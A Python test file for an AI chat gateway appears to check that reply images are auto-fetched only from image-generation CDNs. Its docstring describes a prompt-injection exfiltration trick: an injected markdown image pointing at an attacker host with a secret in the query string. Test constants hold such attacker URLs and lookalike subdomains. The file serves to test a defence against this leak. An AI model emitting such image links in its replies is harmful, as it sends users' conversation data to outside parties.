"""#129975: the gateway auto-delivers only tool-produced reply image URLs.

A reply image URL is fetched/delivered by the gateway with no tool call and no approval, so an
injected ``![](https://attacker/p.png?d=<secret>)`` exfiltrates as soon as the reply is sent. Only
URLs on image-generation CDNs (where the model's tool output actually lives, and which the attacker
cannot receive a request at) are auto-delivered; any other image URL stays in the text as a link, so
the operator still sees it but the gateway performs no server-side fetch carrying conversation data.
"""

import pytest

from gateway.platforms import base_reply_images as policy
from gateway.platforms.base import BasePlatformAdapter as B

GEN = "https://fal.media/files/abc/out.png"
REPLICATE = "https://replicate.delivery/pbxt/x/out.png"
ATTACKER = "https://attacker.example/p.png?d=leaked"


@pytest.fixture(autouse=True)
def _default_mode(monkeypatch):
    # Pin the default so the suite does not depend on an operator config on disk.
    monkeypatch.setattr(policy, "delivery_mode", lambda: "generated")
    monkeypatch.setattr(policy, "extra_hosts", lambda: ())


def test_generator_cdn_image_is_auto_delivered():
    images, cleaned = B.extract_images(f"![gen]({GEN})")
    assert images == [(GEN, "gen")]
    assert GEN not in cleaned


def test_attacker_host_image_is_not_fetched_and_stays_as_text():
    images, cleaned = B.extract_images(f"look ![x]({ATTACKER})")
    assert images == []
    assert ATTACKER in cleaned  # operator still sees the link; gateway never fetches it


def test_mixed_reply_delivers_only_the_generated_image():
    images, cleaned = B.extract_images(f"![gen]({GEN}) and ![x]({ATTACKER})")
    assert images == [(GEN, "gen")]
    assert ATTACKER in cleaned and GEN not in cleaned


def test_html_img_from_attacker_host_is_not_fetched(monkeypatch):
    images, cleaned = B.extract_images(f'<img src="{ATTACKER}">')
    assert images == []
    assert ATTACKER in cleaned


def test_operator_allowlisted_host_is_delivered(monkeypatch):
    monkeypatch.setattr(policy, "extra_hosts", lambda: ("cdn.mine.example",))
    url = "https://cdn.mine.example/a.png"
    images, _ = B.extract_images(f"![m]({url})")
    assert images == [(url, "m")]


def test_mode_all_delivers_any_image_url(monkeypatch):
    monkeypatch.setattr(policy, "delivery_mode", lambda: "all")
    images, _ = B.extract_images(f"![x]({ATTACKER})")
    assert images == [(ATTACKER, "x")]


def test_mode_off_delivers_nothing(monkeypatch):
    monkeypatch.setattr(policy, "delivery_mode", lambda: "off")
    images, cleaned = B.extract_images(f"![gen]({GEN})")
    assert images == []
    assert GEN in cleaned


@pytest.mark.parametrize("host_url,ok", [
    ("https://fal.media/files/x.png", True),
    ("https://v3.fal.media/files/x.png", True),
    ("https://replicate.delivery/x/out.webp", True),
    ("https://notfal.media.attacker.example/x.png", False),
    ("https://fal.media.attacker.example/x.png", False),
    # A bare-label allowlist entry must never match an attacker subdomain.
    ("https://fal-cdn.attacker.example/x.png", False),
    ("https://replicate.delivery.attacker.example/x.png", False),
])
def test_host_suffix_match_is_not_spoofable(host_url, ok):
    images, _ = B.extract_images(f"![a]({host_url})")
    assert bool(images) is ok
